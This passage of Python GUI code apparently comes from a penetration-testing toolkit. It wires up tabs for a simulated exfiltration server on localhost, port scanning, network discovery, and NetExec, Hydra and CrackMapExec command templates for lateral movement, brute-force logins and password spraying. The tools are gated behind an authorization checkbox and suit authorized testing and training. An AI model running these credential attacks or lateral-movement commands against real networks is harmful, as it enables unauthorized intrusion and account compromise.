        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        row = 0
        layout.addWidget(QLabel(f"Dummy File: {self.dummy_file_path} ({self.dummy_file_size_mb} MB)"), row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        self.create_dummy_button = QPushButton("Create Dummy File")
        # self.create_dummy_button.setObjectName("createDummyButton") # No need for specific object name, inherits default green
        self.create_dummy_button.setFont(QFont("Arial", 12, QFont.Weight.Bold))
        self.create_dummy_button.clicked.connect(self.create_dummy_file)
        layout.addWidget(self.create_dummy_button, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignCenter)
        row += 1

        self.dummy_file_progress = QProgressBar()
        self.dummy_file_progress.setRange(0, 100)
        self.dummy_file_progress.setValue(0)
        layout.addWidget(self.dummy_file_progress, row, 0, 1, 2)
        row += 1

        self.dummy_file_progress_label = QLabel("Ready to create dummy file.")
        self.dummy_file_progress_label.setFont(QFont("Arial", 10))
        layout.addWidget(self.dummy_file_progress_label, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        server_section_label = QLabel("Simulated Exfil Server:")
        server_section_label.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        layout.addWidget(server_section_label, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        layout.addWidget(QLabel(f"Server Address: 127.0.0.1:{SIMULATED_EXFIL_SERVER_PORT}"), row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1
        layout.addWidget(QLabel(f"Files will be saved to: {SIMULATED_EXFIL_RECEIVED_DIR}"), row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        button_frame_server = QFrame()
        button_frame_server.setFrameShape(QFrame.Shape.NoFrame)
        button_layout_server = QHBoxLayout(button_frame_server)
        button_layout_server.setContentsMargins(0, 0, 0, 0)
        button_layout_server.setSpacing(20)
        button_layout_server.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.start_server_button = QPushButton("Start Exfil Server")
        # self.start_server_button.setObjectName("startServerButton") # No need for specific object name, inherits default green
        self.start_server_button.setFont(QFont("Arial", 12, QFont.Weight.Bold))
        self.start_server_button.clicked.connect(self.start_exfil_server)
        button_layout_server.addWidget(self.start_server_button)

        self.stop_server_button = QPushButton("Stop Exfil Server")
        self.stop_server_button.setObjectName("stopButton")
        self.stop_server_button.setFont(QFont("Arial", 12, QFont.Weight.Bold))
        self.stop_server_button.clicked.connect(self.stop_exfil_server)
        self.stop_server_button.setEnabled(False)
        button_layout_server.addWidget(self.stop_server_button)

        layout.addWidget(button_frame_server, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignCenter)
        row += 1

        # New: Upload File for Exfil
        upload_file_exfil_frame = QFrame()
        upload_file_exfil_frame.setFrameShape(QFrame.Shape.NoFrame)
        upload_file_exfil_layout = QHBoxLayout(upload_file_exfil_frame)
        upload_file_exfil_layout.setContentsMargins(0, 0, 0, 0)
        upload_file_exfil_layout.setSpacing(10)

        self.upload_exfil_file_button = QPushButton("Select File for Exfil")
        self.upload_exfil_file_button.setFont(QFont("Arial", 10))
        self.upload_exfil_file_button.clicked.connect(self.select_file_for_exfil)
        upload_file_exfil_layout.addWidget(self.upload_exfil_file_button)

        self.exfil_selected_file_label = QLabel("No file selected for exfil.")
        self.exfil_selected_file_label.setFont(QFont("Arial", 10))
        upload_file_exfil_layout.addWidget(self.exfil_selected_file_label)
        upload_file_exfil_layout.addStretch(1)

        layout.addWidget(QLabel("Exfil Source File:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        layout.addWidget(upload_file_exfil_frame, row, 1)
        row += 1

        # Existing exfil options, now using self.exfil_uploaded_file_path if selected
        self.local_dest_label = QLabel("Local Destination Path:")
        self.local_dest_entry = QLineEdit(os.path.join(os.getcwd(), "local_exfil_destination"))
        self.local_dest_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.local_dest_label, row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        layout.addWidget(self.local_dest_entry, row, 1)
        row += 1

        self.remote_url_label = QLabel("Remote Exfil URL:")
        self.exfil_remote_url_entry = QLineEdit(f"http://127.0.0.1:{SIMULATED_EXFIL_SERVER_PORT}/upload")
        self.exfil_remote_url_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.remote_url_label, row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        layout.addWidget(self.exfil_remote_url_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Exfil Destination Type:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.exfil_types = ["Local (Internal)", "Remote (External)", "Both"]
        self.exfil_type_combobox = QComboBox()
        self.exfil_type_combobox.addItems(self.exfil_types)
        self.exfil_type_combobox.setFont(QFont("Arial", 12))
        self.exfil_type_combobox.currentTextChanged.connect(self.on_exfil_type_select)
        layout.addWidget(self.exfil_type_combobox, row, 1)
        row += 1

        self.perform_exfil_button = QPushButton("Perform Simulated Exfil")
        # self.perform_exfil_button.setObjectName("performExfilButton") # No need for specific object name, inherits default green
        self.perform_exfil_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.perform_exfil_button.clicked.connect(self.perform_exfil)
        layout.addWidget(self.perform_exfil_button, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignCenter)
        row += 1

        self.exfil_progress = QProgressBar()
        self.exfil_progress.setRange(0, 100)
        self.exfil_progress.setValue(0)
        layout.addWidget(self.exfil_progress, row, 0, 1, 2)
        row += 1

        self.exfil_progress_label = QLabel("Ready for exfil.")
        self.exfil_progress_label.setFont(QFont("Arial", 10))
        layout.addWidget(self.exfil_progress_label, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        self.exfil_output_label = QLabel("Exfil Output:")
        self.exfil_output_label.setFont(QFont("Arial", 12))
        layout.addWidget(self.exfil_output_label, row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)

        self.exfil_output_text = QTextEdit()
        self.exfil_output_text.setFont(QFont("Monospace", 10))
        self.exfil_output_text.setReadOnly(True)
        layout.addWidget(self.exfil_output_text, row, 1)

        layout.setRowStretch(row, 1)

        # Initial call to set visibility based on default selection
        self.on_exfil_type_select()


    def on_tab_changed(self, index):
        """
        Slot to handle tab changes. Stops any running worker on the previously active tab.
        """
        # Stop all workers except the exfil server
        self.stop_all_workers(exclude_server=True)

        # Update status bar based on current tab (optional, but good for feedback)
        tab_name = self.notebook.tabText(index)
        if self.status_bar: # Check if status_bar is initialized
            self.status_bar.setText(f"Switched to: {tab_name}")

    def stop_all_workers(self, exclude_server=False):
        """
        Stops all active worker threads.
        If exclude_server is True, the exfil server worker will not be stopped.
        """
        # List of tuples: (worker_attr_name, flag_attr_name, start_btn_attr_name, stop_btn_attr_name, timer_attr_name)
        # Use None for attributes that don't exist for a particular worker type.
        workers_to_check_config = [
            ('scan_worker', 'scanning', 'scan_button', 'stop_button', 'port_scan_results_timer'),
            ('network_discovery_worker', 'network_discovery_running', 'start_network_discovery_button', 'stop_network_discovery_button', None),
            ('netexec_worker', 'netexec_running', 'run_netexec_button', 'stop_netexec_button', None),
            ('brute_force_worker', 'brute_force_running', 'start_brute_force_button', 'stop_brute_force_button', None),
            ('password_spray_worker', 'password_spray_running', 'start_password_spray_button', 'stop_password_spray_button', None),
            ('banner_grab_worker', 'banner_grabbing_running', 'start_banner_grab_button', 'stop_banner_grab_button', 'banner_grab_results_timer'),
            ('secretsdump_worker', 'password_dumping_running', 'start_password_dump_button', 'stop_password_dump_button', None),
            ('dummy_file_worker', None, 'create_dummy_button', None, None),
            ('exfil_worker', 'exfil_running', 'perform_exfil_button', None, None)
        ]

        # Handle exfil server separately if needed
        exfil_server_worker = getattr(self, 'exfil_server_worker', None)
        if not exclude_server and exfil_server_worker and exfil_server_worker.isRunning():
            exfil_server_worker.stop()
            self.exfil_server_worker = None # Clear reference
            # Only enable/disable buttons if they are initialized
            if hasattr(self, 'start_server_button') and self.start_server_button: self.start_server_button.setEnabled(True)
            if hasattr(self, 'stop_server_button') and self.stop_server_button: self.stop_server_button.setEnabled(False)
            if hasattr(self, 'status_bar') and self.status_bar:
                self.update_exfil_output("Simulated exfil server stopped due to tab change.\n")


        for worker_attr_name, flag_attr_name, start_btn_attr_name, stop_btn_attr_name, timer_attr_name in workers_to_check_config:
            worker = getattr(self, worker_attr_name, None)
            
            # Safely get button and timer references
            start_button = getattr(self, start_btn_attr_name, None) if start_btn_attr_name else None
            stop_button = getattr(self, stop_btn_attr_name, None) if stop_btn_attr_name else None
            timer = getattr(self, timer_attr_name, None) if timer_attr_name else None

            if worker and worker.isRunning():
                worker.stop()
                # Update the state flag
                if flag_attr_name:
                    setattr(self, flag_attr_name, False)
                # Update buttons - check if they exist before enabling/disabling
                if start_button:
                    start_button.setEnabled(True)
                if stop_button:
                    stop_button.setEnabled(False)
                # Stop associated timer if any
                if timer and timer.isActive():
                    timer.stop()
                    # For queue-based workers, ensure a final flush
                    if worker_attr_name == 'scan_worker':
                        self._process_scan_results_from_queue()
                    elif worker_attr_name == 'banner_grab_worker':
                        self._process_banner_grab_results_from_queue()

                # Clear worker reference (important for QThreads)
                setattr(self, worker_attr_name, None)

                if hasattr(self, 'status_bar') and self.status_bar:
                    self.status_bar.setText("Operation stopped due to tab change.")

    def closeEvent(self, event):
        """
        Overrides the close event to ensure all threads are stopped gracefully.
        """
        self.stop_all_workers(exclude_server=False) # Stop all workers, including the server
        event.accept()

    def start_scan(self):
        if self.scanning:
            self.show_message_box("Scan in Progress", "A scan is already running.")
            return

        if not self.authorization_checked:
            self.show_message_box("Authorization Required",
                                   "You must confirm you have explicit authorization to scan and interact with this network.",
                                   QMessageBox.Icon.Warning)
            return

        target_input = self.target_entry.text().strip()
        port_range_input = self.port_range_entry.text().strip()
        threads_input = self.threads_entry.text().strip()

        if not target_input or not port_range_input:
            self.show_message_box("Input Error", "Please enter a target IP/hostname/CIDR and a port range.",
                                  QMessageBox.Icon.Critical)
            return

        try:
            threads = int(threads_input)
            if not (1 <= threads <= 200): # Enforce the new limit
                raise ValueError("Threads out of range")
        except ValueError:
            self.show_message_box("Input Error", "Number of threads must be an integer between 1 and 200.", # Updated message
                                  QMessageBox.Icon.Critical)
            return


        self.results_text.clear()
        self.status_bar.setText("Scanning...")
        self.scanning = True
        self.scan_button.setEnabled(False)
        self.stop_button.setEnabled(True)

        if self.use_nmap_checkbox.isChecked():
            # Check if nmap is available
            if not shutil.which("nmap"):
                self.show_message_box("Nmap Not Found", "Nmap command not found. Please install Nmap or use the Python Port Scanner.", QMessageBox.Icon.Warning)
                self.scanning = False
                self.scan_button.setEnabled(True)
                self.stop_button.setEnabled(False)
                return
            self.scan_worker = NmapScanWorker(target_input, port_range_input, self.authorization_checked)
            self.scan_worker.update_results.connect(self.update_results) # Nmap worker still uses direct update
        elif self.use_python_scanner_checkbox.isChecked():
            self.scan_worker = AdvancedPortScanWorker(target_input, port_range_input, threads, self.authorization_checked) # Pass threads
            self.scan_worker.data_available.connect(self._process_scan_results_from_queue) # Connect new signal
            self.port_scan_results_timer.start() # Start the timer for processing results
        else:
            self.show_message_box("Scanner Selection Error", "Please select either 'Use Python Port Scanner' or 'Use Nmap for Scan'.", QMessageBox.Icon.Critical)
            self.scanning = False
            self.scan_button.setEnabled(True)
            self.stop_button.setEnabled(False)
            return

        self.scan_worker.update_status.connect(self.status_bar.setText)
        self.scan_worker.scan_finished.connect(self.on_scan_finished)
        self.scan_worker.start()

    def _process_scan_results_from_queue(self):
        """Reads all available results from the worker's queue and updates the QTextEdit."""
        if self.scan_worker and hasattr(self.scan_worker, 'results_queue'):
            results_batch = []
            while True:
                try:
                    item = self.scan_worker.results_queue.get_nowait()
                    results_batch.append(item)
                except Empty:
                    break
            if results_batch:
                self.results_text.append("\n".join(results_batch))
                # Auto-scroll to the bottom
                self.results_text.verticalScrollBar().setValue(self.results_text.verticalScrollBar().maximum())


    def toggle_nmap_usage(self):
        self.use_nmap_for_scan = self.use_nmap_checkbox.isChecked()
        if self.use_nmap_for_scan:
            self.use_python_scanner_checkbox.setChecked(False)
            self.threads_entry.setEnabled(False) # Disable threads input for Nmap
        else:
            if not self.use_python_scanner_checkbox.isChecked():
                self.use_python_scanner_checkbox.setChecked(True)
            self.threads_entry.setEnabled(True) # Enable threads input for Python scanner

    def toggle_python_scanner_usage(self):
        self.use_python_for_scan = self.use_python_scanner_checkbox.isChecked()
        if self.use_python_for_scan:
            self.use_nmap_checkbox.setChecked(False)
            self.threads_entry.setEnabled(True) # Enable threads input for Python scanner
        else:
            if not self.use_nmap_checkbox.isChecked():
                self.use_nmap_checkbox.setChecked(True)
            self.threads_entry.setEnabled(False) # Disable threads input for Nmap

    def stop_scan(self):
        if self.scanning:
            if self.scan_worker and self.scan_worker.isRunning():
                self.scan_worker.stop()
            self.scanning = False
            self.scan_button.setEnabled(True)
            self.stop_button.setEnabled(False)
            self.status_bar.setText("Scan stopped.")
            if self.port_scan_results_timer and self.port_scan_results_timer.isActive(): # Check if timer exists and is active
                self.port_scan_results_timer.stop() # Stop the timer
            self._process_scan_results_from_queue() # Final flush
        else:
            self.show_message_box("No Scan Running", "No active scan to stop.")

    def on_scan_finished(self):
        self.scanning = False
        self.scan_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        if self.port_scan_results_timer and self.port_scan_results_timer.isActive(): # Check if timer exists and is active
            self.port_scan_results_timer.stop() # Stop the timer
        self._process_scan_results_from_queue() # Final flush
        self.scan_worker = None # Clear worker reference

    def update_results(self, message):
        # This method is now only used by the Nmap worker, which emits less frequently.
        self.results_text.append(message.strip())
        self.results_text.verticalScrollBar().setValue(self.results_text.verticalScrollBar().maximum())

    # --- Network Discovery Methods (Scapy) ---
    def start_network_discovery(self):
        if self.network_discovery_running:
            self.show_message_box("Network Discovery in Progress", "A network discovery operation is already running.")
            return

        if not self.authorization_checked:
            self.show_message_box("Authorization Required",
                                   "You must confirm you have explicit authorization to scan and interact with this network.",
                                   QMessageBox.Icon.Warning)
            return

        if not SCAPY_AVAILABLE:
            self.show_message_box("Scapy Not Found", "Scapy is not installed. Network Discovery features require Scapy. Please install it using 'pip install scapy'.", QMessageBox.Icon.Critical)
            return

        target_ip = self.network_discovery_target_entry.text().strip()
        pcap_filename = self.network_discovery_pcap_entry.text().strip()

        if not target_ip:
            self.show_message_box("Input Error", "Please enter a target IP/range for network discovery.",
                                  QMessageBox.Icon.Critical)
            return

        self.network_discovery_results_text.clear()
        self.network_discovery_running = True
        self.start_network_discovery_button.setEnabled(False)
        self.stop_network_discovery_button.setEnabled(True)

        self.network_discovery_worker = ScapyNetworkScanWorker(target_ip, pcap_filename, self.authorization_checked)
        self.network_discovery_worker.update_results.connect(self.update_network_discovery_results)
        self.network_discovery_worker.update_status.connect(self.status_bar.setText)
        self.network_discovery_worker.scan_finished.connect(self.on_network_discovery_finished)
        self.network_discovery_worker.start()

    def stop_network_discovery(self):
        if self.network_discovery_running:
            if self.network_discovery_worker and self.network_discovery_worker.isRunning():
                self.network_discovery_worker.stop()
            self.network_discovery_running = False
            self.start_network_discovery_button.setEnabled(True)
            self.stop_network_discovery_button.setEnabled(False)
            self.status_bar.setText("Network discovery stopped.")
        else:
            self.show_message_box("No Network Discovery Running", "No active network discovery operation to stop.")

    def on_network_discovery_finished(self):
        self.network_discovery_running = False
        self.start_network_discovery_button.setEnabled(True)
        self.stop_network_discovery_button.setEnabled(False)
        self.network_discovery_worker = None # Clear worker reference

    def update_network_discovery_results(self, message):
        self.network_discovery_results_text.append(message.strip())
        self.network_discovery_results_text.verticalScrollBar().setValue(self.network_discovery_results_text.verticalScrollBar().maximum())

    # --- Lateral Movement (NetExec) Methods ---
    def on_netexec_protocol_select(self):
        selected_protocol = self.netexec_protocol_combobox.currentText()
        
        # Default command templates for NetExec/CrackMapExec
        command_template = ""
        if selected_protocol == "smb":
            command_template = f"netexec smb <target_ip> --shares"
        elif selected_protocol == "ssh":
            command_template = f"netexec ssh <target_ip> -u <username> -p <password>"
        elif selected_protocol == "winrm":
            command_template = f"netexec winrm <target_ip> -u <username> -p <password> --cmd \"whoami\""
        elif selected_protocol == "mssql":
            command_template = f"netexec mssql <target_ip> -u <username> -p <password>"
        elif selected_protocol == "ldap":
            command_template = f"netexec ldap <target_ip> -u <username> -p <password> --users"
        elif selected_protocol == "rdp":
            command_template = f"netexec rdp <target_ip> -u <username> -p <password>"
        elif selected_protocol == "vnc":
            command_template = f"netexec vnc <target_ip> -u <username> -p <password>"

        self.netexec_command_edit.setText(command_template)

    def run_netexec(self):
        if self.netexec_running:
            self.show_message_box("NetExec in Progress", "A NetExec command is already running.")
            return

        if not self.authorization_checked:
            self.show_message_box("Authorization Required",
                                   "You must confirm you have explicit authorization to scan and interact with this network.",
                                   QMessageBox.Icon.Warning)
            return

        target_input = self.netexec_target_entry.text().strip()
        # Get the command directly from the editable QLineEdit
        command_str = self.netexec_command_edit.text().strip()

        if not target_input or not command_str:
            self.show_message_box("Input Error", "Please enter a target IP/range and a NetExec command.",
                                  QMessageBox.Icon.Critical)
            return

        # Determine the actual executable name based on the command string
        # If the command starts with "crackmapexec", use that for shutil.which check
        # Otherwise, assume "netexec"
        command_prefix = command_str.split(" ")[0].lower()
        executable_to_check = "netexec"
        if command_prefix == "crackmapexec":
            executable_to_check = "crackmapexec"

        if not shutil.which(executable_to_check):
            self.show_message_box(f"{executable_to_check} Not Found", f"'{executable_to_check}' command not found. Please install NetExec (or CrackMapExec) and ensure it's in your system's PATH.", QMessageBox.Icon.Warning)
            return

        self.netexec_output_text.clear()
        self.netexec_running = True
        self.run_netexec_button.setEnabled(False)
        self.stop_netexec_button.setEnabled(True)

        # Pass the full edited command string to the worker
        self.netexec_worker = NetExecWorker(command_str, target_input, self.authorization_checked)
        self.netexec_worker.update_output.connect(self.update_netexec_output)
        self.netexec_worker.update_status.connect(self.status_bar.setText)
        self.netexec_worker.netexec_finished.connect(self.on_netexec_finished)
        self.netexec_worker.start()

    def stop_netexec(self):
        if self.netexec_running:
            if self.netexec_worker and self.netexec_worker.isRunning():
                self.netexec_worker.stop()
            self.netexec_running = False
            self.run_netexec_button.setEnabled(True)
            self.stop_netexec_button.setEnabled(False)
            self.status_bar.setText("NetExec stopped.")
        else:
            self.show_message_box("No NetExec Running", "No active NetExec command to stop.")

    def on_netexec_finished(self):
        self.netexec_running = False
        self.run_netexec_button.setEnabled(True)
        self.stop_netexec_button.setEnabled(False)
        self.netexec_worker = None # Clear worker reference

    def update_netexec_output(self, message):
        self.netexec_output_text.append(message.strip())
        self.netexec_output_text.verticalScrollBar().setValue(self.netexec_output_text.verticalScrollBar().maximum())

    # --- Brute Force Methods ---
    def on_brute_force_tool_select(self):
        selected_tool = self.brute_force_tool_combobox.currentText()
        selected_protocol = self.brute_force_protocol_combobox.currentText()
        
        # Update command template based on selected tool and protocol
        command_template = ""
        if selected_tool == "Hydra":
            command_template = f"hydra -l <username> -P <wordlist_file> <target_ip> {selected_protocol}"
        elif selected_tool == "NetExec":
            # Changed from -P to -p based on user feedback for flag compatibility.
            command_template = f"netexec {selected_protocol} <target_ip> -u <username> -p <wordlist_file> --continue-on-success"
        elif selected_tool == "CrackMapExec": # CrackMapExec is an alias for NetExec
            # Changed from -P to -p based on user feedback for flag compatibility.
            command_template = f"crackmapexec {selected_protocol} <target_ip> -u <username> -p <wordlist_file> --continue-on-success"
    
        self.brute_force_command_edit.setText(command_template)

    def on_brute_force_wordlist_option_changed(self):
        # Temporarily block signals to prevent recursive calls
        self.use_rockyou_checkbox.blockSignals(True)
        self.brute_force_paste_wordlist_text.blockSignals(True)
        
        pasted_text_present = self.brute_force_paste_wordlist_text.toPlainText().strip() != ""
        
        file_path_value = getattr(self, 'brute_force_wordlist_file_path', None)
        file_path_exists = file_path_value is not None and os.path.exists(file_path_value)

        # Determine the active selection
        if pasted_text_present:
            # User is pasting a wordlist
            self.use_rockyou_checkbox.setChecked(False)
            self.brute_force_paste_wordlist_text.setEnabled(True)
            self.upload_brute_force_wordlist_button.setEnabled(False)
            self.brute_force_wordlist_file_label.setText("Using pasted wordlist.")
            self.brute_force_wordlist_file_path = None # Clear file path if pasting
        elif self.use_rockyou_checkbox.isChecked():
            # User selected default rockyou.txt
            self.brute_force_paste_wordlist_text.clear()
            self.brute_force_paste_wordlist_text.setEnabled(False)
            self.upload_brute_force_wordlist_button.setEnabled(False)
            self.brute_force_wordlist_file_label.setText("Using default rockyou.txt")
            self.brute_force_wordlist_file_path = None # Clear file path if using default
        elif file_path_exists:
            # A file was previously uploaded and still exists
            self.use_rockyou_checkbox.setChecked(False)
            self.brute_force_paste_wordlist_text.clear()
            self.brute_force_paste_wordlist_text.setEnabled(False)
            self.upload_brute_force_wordlist_button.setEnabled(True) # Keep enabled to allow changing file
            # Label is already set by upload_brute_force_wordlist, and path is kept
        else:
            # No paste, no default checked, no existing uploaded file.
            # This means the user has unchecked default and cleared paste,
            # or started fresh without any explicit selection.
            # In this case, enable both paste and upload options.
            self.use_rockyou_checkbox.setChecked(False) # Ensure it's unchecked
            self.brute_force_paste_wordlist_text.setEnabled(True)
            self.upload_brute_force_wordlist_button.setEnabled(True)
            self.brute_force_wordlist_file_label.setText("No file selected.")
            self.brute_force_wordlist_file_path = None # Ensure no stale path

        # Re-enable signals
        self.use_rockyou_checkbox.blockSignals(False)
        self.brute_force_paste_wordlist_text.blockSignals(False)


    def upload_brute_force_wordlist(self):
        file_dialog = QFileDialog(self)
        file_dialog.setWindowTitle("Select Wordlist File")
        file_dialog.setNameFilter("Text files (*.txt)")
        if file_dialog.exec() == QFileDialog.DialogCode.Accepted:
            selected_file = file_dialog.selectedFiles()[0]
            self.brute_force_wordlist_file_path = selected_file # Store path
            self.brute_force_wordlist_file_label.setText(os.path.basename(selected_file))
            self.on_brute_force_wordlist_option_changed() # Update UI state after file selection

    def start_brute_force(self):
        if self.brute_force_running:
            self.show_message_box("Brute Force in Progress", "A brute force operation is already running.")
            return

        if not self.authorization_checked:
            self.show_message_box("Authorization Required",
                                   "You must confirm you have explicit authorization to scan and interact with this network.",
                                   QMessageBox.Icon.Warning)
            return

        target = self.brute_force_target_entry.text().strip()
        username = self.brute_force_username_entry.text().strip()
        tool = self.brute_force_tool_combobox.currentText()
        protocol = self.brute_force_protocol_combobox.currentText()
        edited_command = self.brute_force_command_edit.text().strip() # Get edited command

        if not target or not username:
            self.show_message_box("Input Error", "Please enter a target and a username.", QMessageBox.Icon.Critical)
            return

        wordlist_content = ""
        wordlist_source_path = None # To store the actual path if using file
        if self.brute_force_paste_wordlist_text.toPlainText().strip(): # Priority 1: Pasted text
            wordlist_content = self.brute_force_paste_wordlist_text.toPlainText().strip()
        elif hasattr(self, 'brute_force_wordlist_file_path') and self.brute_force_wordlist_file_path is not None and os.path.exists(self.brute_force_wordlist_file_path): # Priority 2: Uploaded file
            try:
                with open(self.brute_force_wordlist_file_path, 'r') as f:
                    wordlist_content = f.read().strip()
                wordlist_source_path = self.brute_force_wordlist_file_path # Store path for replacement
            except Exception as e:
                self.show_message_box("File Error", f"Could not read wordlist file: {e}", QMessageBox.Icon.Critical)
                return
        elif self.use_rockyou_checkbox.isChecked(): # Priority 3: Default rockyou
            try:
                with open(self.rockyou_wordlist_path, 'r') as f:
                    wordlist_content = f.read().strip()
                wordlist_source_path = self.rockyou_wordlist_path # Store path for replacement
            except FileNotFoundError:
                self.show_message_box("File Error", f"Default rockyou.txt not found at '{self.rockyou_wordlist_path}'. Please create it or provide your own.", QMessageBox.Icon.Critical)
                return
            except Exception as e:
                self.show_message_box("File Error", f"Error reading default rockyou.txt: {e}", QMessageBox.Icon.Critical)
                return
        else: # Fallback: No wordlist selected/provided
            self.show_message_box("Wordlist Error", "Please provide a wordlist (paste or upload) or select 'Use default rockyou.txt'.", QMessageBox.Icon.Critical)
            return

        if not wordlist_content:
            self.show_message_box("Wordlist Error", "The selected wordlist is empty.", QMessageBox.Icon.Critical)
            return

        # Check if the selected tool is available
        tool_command_executable = tool.lower()
        if tool == "CrackMapExec":
            tool_command_executable = "crackmapexec"

        if not shutil.which(tool_command_executable):
            self.show_message_box(f"{tool} Not Found", f"'{tool_command_executable}' command not found. Please install {tool} and ensure it's in your system's PATH.", QMessageBox.Icon.Warning)
            return

        self.brute_force_output_text.clear()
        self.brute_force_running = True
        self.start_brute_force_button.setEnabled(False)
        self.stop_brute_force_button.setEnabled(True)

        # Pass the edited command string, and the determined wordlist content/path
        self.brute_force_worker = BruteForceWorker(target, username, wordlist_content, tool, protocol, self.authorization_checked)
        self.brute_force_worker.update_output.connect(self.update_brute_force_output)
        self.brute_force_worker.update_status.connect(self.status_bar.setText)
        self.brute_force_worker.brute_force_finished.connect(self.on_brute_force_finished)
        self.brute_force_worker.start()

    def stop_brute_force(self):
        if self.brute_force_running:
            if self.brute_force_worker and self.brute_force_worker.isRunning():
                self.brute_force_worker.stop()
            self.brute_force_running = False
            self.start_brute_force_button.setEnabled(True)
            self.stop_brute_force_button.setEnabled(False)
            self.status_bar.setText("Brute force stopped.")
        else:
            self.show_message_box("No Brute Force Running", "No active brute force operation to stop.")

    def on_brute_force_finished(self):
        self.brute_force_running = False
        self.start_brute_force_button.setEnabled(True)
        self.stop_brute_force_button.setEnabled(False)
        self.brute_force_worker = None # Clear worker reference

    def update_brute_force_output(self, message):
        self.brute_force_output_text.append(message.strip())
        self.brute_force_output_text.verticalScrollBar().setValue(self.brute_force_output_text.verticalScrollBar().maximum())

    # --- Password Spray Methods ---
    def on_password_spray_tool_select(self):
        selected_tool = self.password_spray_tool_combobox.currentText()
        selected_protocol = self.password_spray_protocol_combobox.currentText()

        # Update command template based on selected tool and protocol
        command_template = ""
        if selected_tool == "Hydra":
            command_template = f"hydra -L <usernames_file> -p <password> <target_ip> {selected_protocol}"
        elif selected_tool == "NetExec":
            # Changed from -U to -u based on user feedback for flag compatibility.
            command_template = f"netexec {selected_protocol} <target_ip> -u <usernames_file> -p <password>"
        elif selected_tool == "CrackMapExec":
            # Changed from -U to -u based on user feedback for flag compatibility.
            command_template = f"crackmapexec {selected_protocol} <target_ip> -u <usernames_file> -p <password>"
        
        self.password_spray_command_edit.setText(command_template)

    def on_password_spray_usernames_option_changed(self):
        paste_usernames_empty = self.password_spray_paste_usernames_text.toPlainText().strip() == ""
        
        # Safely check for file existence
        file_path_value = getattr(self, 'password_spray_usernames_file_path', None)
        file_selected = file_path_value is not None and \
                        os.path.exists(file_path_value) and \
                        self.password_spray_usernames_file_label.text() not in ["No file selected.", "Using pasted usernames."]

        if not paste_usernames_empty:
            self.password_spray_paste_usernames_text.setEnabled(True)
            self.upload_password_spray_usernames_button.setEnabled(False)
            self.password_spray_usernames_file_label.setText("Using pasted usernames.")
            if hasattr(self, 'password_spray_usernames_file_path'):
                self.password_spray_usernames_file_path = None
        elif file_selected:
            self.password_spray_paste_usernames_text.setEnabled(False)
            self.upload_password_spray_usernames_button.setEnabled(True)
        else:
            self.password_spray_paste_usernames_text.setEnabled(True)
            self.upload_password_spray_usernames_button.setEnabled(True)
            self.password_spray_usernames_file_label.setText("No file selected.")


    def upload_password_spray_usernames(self):
        file_dialog = QFileDialog(self)
        file_dialog.setWindowTitle("Select Usernames File")
        file_dialog.setNameFilter("Text files (*.txt)")
        if file_dialog.exec() == QFileDialog.DialogCode.Accepted:
            selected_file = file_dialog.selectedFiles()[0]
            self.password_spray_usernames_file_path = selected_file
            self.password_spray_usernames_file_label.setText(os.path.basename(selected_file))
            self.on_password_spray_usernames_option_changed()

    def start_password_spray(self):
        if self.password_spray_running:
            self.show_message_box("Password Spray in Progress", "A password spray operation is already running.")
            return

        if not self.authorization_checked:
            self.show_message_box("Authorization Required",
                                   "You must confirm you have explicit authorization to scan and interact with this network.",
                                   QMessageBox.Icon.Warning)
            return

        target = self.password_spray_target_entry.text().strip()
        password = self.password_spray_password_entry.text().strip()
        tool = self.password_spray_tool_combobox.currentText()
        protocol = self.password_spray_protocol_combobox.currentText()
        edited_command = self.password_spray_command_edit.text().strip() # Get edited command

        if not target or not password:
            self.show_message_box("Input Error", "Please enter a target and a password.", QMessageBox.Icon.Critical)
            return

        usernames_content = ""
        usernames_source_path = None # To store the actual path if using file
        if self.password_spray_paste_usernames_text.toPlainText().strip():
            usernames_content = self.password_spray_paste_usernames_text.toPlainText().strip()
        elif hasattr(self, 'password_spray_usernames_file_path') and self.password_spray_usernames_file_path is not None and os.path.exists(self.password_spray_usernames_file_path): # Added None check
            try:
                with open(self.password_spray_usernames_file_path, 'r') as f:
                    usernames_content = f.read().strip()
                usernames_source_path = self.password_spray_usernames_file_path # Store path for replacement
            except Exception as e:
                self.show_message_box("File Error", f"Could not read usernames file: {e}", QMessageBox.Icon.Critical)
                return
        else:
            self.show_message_box("Usernames Error", "Please provide a list of usernames (paste or upload).", QMessageBox.Icon.Critical)
            return

        if not usernames_content:
            self.show_message_box("Usernames Error", "The provided usernames list is empty.", QMessageBox.Icon.Critical)
            return

        # Check if the selected tool is available
        tool_command_executable = tool.lower()
        if tool == "CrackMapExec":
            tool_command_executable = "crackmapexec"

        if not shutil.which(tool_command_executable):
            self.show_message_box(f"{tool} Not Found", f"'{tool_command_executable}' command not found. Please install {tool} and ensure it's in your system's PATH.", QMessageBox.Icon.Warning)
            return

        self.password_spray_output_text.clear()
        self.status_bar.setText("Running password spray...")
        self.password_spray_running = True
        self.start_password_spray_button.setEnabled(False)
        self.stop_password_spray_button.setEnabled(True)

        # Pass the edited command string, and the determined usernames content/path
        self.password_spray_worker = PasswordSprayWorker(target, usernames_content, password, tool, protocol, self.authorization_checked)
